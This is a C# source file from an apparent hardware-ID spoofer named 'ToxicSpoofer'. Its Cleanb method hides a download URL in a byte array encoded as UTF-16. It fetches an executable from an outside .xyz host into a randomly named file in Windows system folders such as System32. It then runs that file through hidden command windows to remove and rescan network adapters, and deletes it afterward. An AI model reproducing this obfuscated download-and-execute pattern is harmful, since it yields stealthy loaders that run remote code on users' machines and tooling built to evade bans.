using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ArmDot.Client;

namespace ToxicSpoofer
{
    class Adapters
    {
        [VirtualizeCode]
        public static void CheckForInternetConnection()
        {
            try
            {
                using (WebClient webClient = new WebClient())
                {
                    using (webClient.OpenRead("http://clients3.google.com/generate_204"))
                    {
                    }
                }
            }
            catch
            {
                Thread.Sleep(1000);
                CheckForInternetConnection();
            }
        }

        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "abcdefghilmnopqrsovzt1289426915947";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        public static int RandomNumber(int min, int max)
        {
            Random random = new Random();
            return random.Next(min, max);
        }
        [VirtualizeCode]
        public static void Cleanb()
        {


            string Username = Environment.UserName;
            string driveLetter = Path.GetPathRoot(Environment.CurrentDirectory);
            string[] Directorys =
            {
                 $@"{driveLetter}Windows\Resources\Themes\aero",
                $@"{driveLetter}Windows\Media",
                $@"{driveLetter}Windows\System32",
                $@"{driveLetter}Windows\SysWOW64",
                $@"{driveLetter}Windows\Branding\BaseBrd",
                $@"{driveLetter}Windows\InputMethod\CHS",
                $@"{driveLetter}Windows\Help\en-US",
                $@"{driveLetter}Windows\IdentityCRL\INT",
            };
            string name = RandomString(5);
            int i = RandomNumber(0, 8);
            string path = Directorys[i] + @"\" + name + ".exe";

            byte[] dnString = new byte[92];
            dnString[0] = 104;
            dnString[1] = 0;
            dnString[2] = 116;
            dnString[3] = 0;
            dnString[4] = 116;
            dnString[5] = 0;
            dnString[6] = 112;
            dnString[7] = 0;
            dnString[8] = 115;
            dnString[9] = 0;
            dnString[10] = 58;
            dnString[11] = 0;
            dnString[12] = 47;
            dnString[13] = 0;
            dnString[14] = 47;
            dnString[15] = 0;
            dnString[16] = 118;
            dnString[17] = 0;
            dnString[18] = 101;
            dnString[19] = 0;
            dnString[20] = 114;
            dnString[21] = 0;
            dnString[22] = 97;
            dnString[23] = 0;
            dnString[24] = 113;
            dnString[25] = 0;
            dnString[26] = 122;
            dnString[27] = 0;
            dnString[28] = 46;
            dnString[29] = 0;
            dnString[30] = 120;
            dnString[31] = 0;
            dnString[32] = 121;
            dnString[33] = 0;
            dnString[34] = 122;
            dnString[35] = 0;
            dnString[36] = 47;
            dnString[37] = 0;
            dnString[38] = 85;
            dnString[39] = 0;
            dnString[40] = 85;
            dnString[41] = 0;
            dnString[42] = 81;
            dnString[43] = 0;
            dnString[44] = 85;
            dnString[45] = 0;
            dnString[46] = 69;
            dnString[47] = 0;
            dnString[48] = 81;
            dnString[49] = 0;
            dnString[50] = 69;
            dnString[51] = 0;
            dnString[52] = 81;
            dnString[53] = 0;
            dnString[54] = 73;
            dnString[55] = 0;
            dnString[56] = 65;
            dnString[57] = 0;
            dnString[58] = 83;
            dnString[59] = 0;
            dnString[60] = 73;
            dnString[61] = 0;
            dnString[62] = 57;
            dnString[63] = 0;
            dnString[64] = 65;
            dnString[65] = 0;
            dnString[66] = 47;
            dnString[67] = 0;
            dnString[68] = 100;
            dnString[69] = 0;
            dnString[70] = 101;
            dnString[71] = 0;
            dnString[72] = 118;
            dnString[73] = 0;
            dnString[74] = 99;
            dnString[75] = 0;
            dnString[76] = 111;
            dnString[77] = 0;
            dnString[78] = 110;
            dnString[79] = 0;
            dnString[80] = 54;
            dnString[81] = 0;
            dnString[82] = 52;
            dnString[83] = 0;
            dnString[84] = 46;
            dnString[85] = 0;
            dnString[86] = 101;
            dnString[87] = 0;
            dnString[88] = 120;
            dnString[89] = 0;
            dnString[90] = 101;
            dnString[91] = 0;
            string DNString_dnString = System.Text.Encoding.Unicode.GetString(dnString);

            WebClient webClient = new WebClient();
            try
            {
                webClient.DownloadFile(DNString_dnString, $@"{path}");
                Process process = new Process();
                Process cmd2 = new Process();
                cmd2.StartInfo.FileName = "cmd.exe";
                cmd2.StartInfo.RedirectStandardInput = true;
                cmd2.StartInfo.RedirectStandardError = false;
                cmd2.StartInfo.RedirectStandardOutput = false;
                cmd2.StartInfo.CreateNoWindow = true;
                cmd2.StartInfo.UseShellExecute = false;
                cmd2.Start();
                cmd2.StandardInput.WriteLine($@"{path} /r remove =net");
                cmd2.StandardInput.WriteLine("exit");
                cmd2.WaitForExit();

                Thread.Sleep(1000);

                Process cmd4 = new Process();
                cmd4.StartInfo.FileName = "cmd.exe";
                cmd4.StartInfo.RedirectStandardInput = true;
                cmd4.StartInfo.RedirectStandardError = false;
                cmd4.StartInfo.RedirectStandardOutput = false;
                cmd4.StartInfo.UseShellExecute = false;
                cmd4.StartInfo.CreateNoWindow = true;
                cmd4.Start();
                cmd4.StandardInput.WriteLine($@"{path} rescan");
                cmd4.StandardInput.WriteLine("exit");
                cmd4.WaitForExit();
                File.Delete(path);
            }
            catch
            {
                if (File.Exists(path))
                {
                    File.Delete(path);
                }

                Console.ResetColor();
            }
        }
    }
}
